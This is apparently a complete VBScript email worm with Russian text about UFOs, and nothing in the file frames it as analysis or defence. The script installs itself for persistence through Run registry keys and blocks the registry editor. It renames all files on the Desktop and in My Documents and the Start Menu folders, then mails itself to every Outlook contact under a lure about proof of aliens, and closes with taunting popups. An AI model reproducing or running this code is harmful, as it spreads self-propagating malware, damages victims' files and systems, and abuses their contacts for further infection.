Set f = CreateObject("scripting.filesystemobject")
Set s = CreateObject("Wscript.Shell")
t=0: on error resume next
Set os = CreateObject("Shell.Application")
set ie = WScript.CreateObject("InternetExplorer.Application")
Set oe = WScript.CreateObject("Outlook.Application")

Set File2 = f.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigab yte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServic es\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

s.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\S YSTEM\DisableRegistryTools", 1, "REG_DWORD"

For Each Folder In s.SpecialFolders
if right(folder,12)="Рабочий стол" then 
set tf=f.getfolder(folder)
set af=tf.files
For Each fl In af
set file=f.getfile(fl):t=t+1
file.name="Пришельцы уже тут" & t
next
end if
next


For Each Folder In s.SpecialFolders
if right(folder,13)="Мои документы" then 
set tf=f.getfolder(folder)
set af=tf.files
For Each fl In af
set file=f.getfile(fl):t=t+1
file.name="Пришельцы уже тут" & t
next
end if
next

For Each Folder In s.SpecialFolders
if right(folder,13)="Мои документы" then 
set tf=f.getfolder(folder): tf.name="Пришельцы уже тут"
End if
next


For Each Folder In s.SpecialFolders
if right(folder,12)="Главное меню" then 
set tf=f.getfolder(folder)
set af=tf.subfolders
For Each fl In af
set file=f.getfolder(fl):t=t+1
file.name="Пришельцы уже тут" & t
next
end if
next


For Index = 1 To oe.GetNameSpace("MAPI").AddressLists(1).count
Set OutMail = oe.CreateItem(0)
OutMail.to = oe.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "Правда об НЛО"
OutMail.Body = "Пришельцы здесь! В письме доказательства!"
OutMail.Attachments.Add WScript.ScriptFullName
OutMail.Send
Next


s.popup "Внимание! Этот файл доказывает существование внеземной цивилизации", , "Доказательства", 0+48

s.popup "Через некоторое время Вы сами это поймете!", , "Доказательства", 0+48

s.popup "А как по Вашему, почему пришельцы существуют?", , "Доказательства", 0+48

s.popup "Может быть потому, что Вселенная безгранична?", , "Доказательства", 0+48

s.popup "Вы пока ничего не поняли? Ничего скоро поймете... Гы...", , "Доказательства", 0+48